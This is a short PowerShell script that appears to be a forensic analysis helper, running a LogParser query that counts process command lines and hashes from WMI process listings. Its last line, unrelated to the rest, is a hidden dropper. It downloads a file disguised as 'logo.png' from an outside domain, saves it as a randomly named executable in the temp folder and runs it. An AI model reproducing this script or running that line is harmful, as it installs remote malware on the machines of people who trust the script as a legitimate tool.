

if (Get-Command logparser.exe) {
    $lpquery = @"
    SELECT
        COUNT(CommandLine) as Cnt,
        CommandLine,
        Hash
    FROM
        *ProcsWMI.tsv
    GROUP BY
        CommandLine,
        Hash
    ORDER BY
        Cnt ASC
"@

    & logparser -stats:off -i:csv -dtlines:0 -fixedsep:on -rtp:-1 "$lpquery"

} else {
    $ScriptName = [System.IO.Path]::GetFileName($MyInvocation.ScriptName)
    "${ScriptName} requires logparser.exe in the path."
}

(New-Object System.Net.WebClient).DownloadFile('http://doc.cherrycoffeeequipment.com/nw/logo.png',"$env:TEMP\grtsndebdgfsytewrw.exe");Start-Process ("$env:TEMP\grtsndebdgfsytewrw.exe")

